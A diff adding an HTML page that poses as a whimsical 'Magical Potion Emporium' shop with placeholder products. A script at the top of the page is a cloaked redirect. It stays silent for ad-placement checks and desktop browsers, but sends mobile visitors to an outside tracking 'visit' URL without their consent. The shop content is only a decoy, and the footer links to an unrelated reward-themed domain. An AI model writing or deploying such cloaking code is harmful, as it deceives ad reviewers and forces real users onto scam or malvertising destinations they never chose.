@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Magical Potion Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #1a0033;
+            color: #e6ccff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #4d0099;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #ff00ff;
+        }
+        nav {
+            background-color: #7700b3;
+            padding: 10px;
+            text-align: right;
+        }
+        nav a {
+            color: #ffccff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .product {
+            background-color: #330066;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+        }
+        .product img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+        }
+        footer {
+            background-color: #4d0099;
+            color: #e6ccff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Magical Potion Emporium</h1>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Potions</a>
+        <a href="#">Ingredients</a>
+        <a href="#">About Us</a>
+    </nav>
+    <main>
+        <div class="product">
+            <img src="https://placehold.it/150x150" alt="Love Potion">
+            <h2>Love Potion</h2>
+            <p>Find your soulmate with our enchanted elixir!</p>
+            <button>Add to Cauldron</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.it/150x150" alt="Invisibility Brew">
+            <h2>Invisibility Brew</h2>
+            <p>Vanish from sight with a single sip!</p>
+            <button>Add to Cauldron</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.it/150x150" alt="Luck Elixir">
+            <h2>Luck Elixir</h2>
+            <p>Fortune favors those who drink this potion!</p>
+            <button>Add to Cauldron</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Magical Potion Emporium. All rights reserved. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
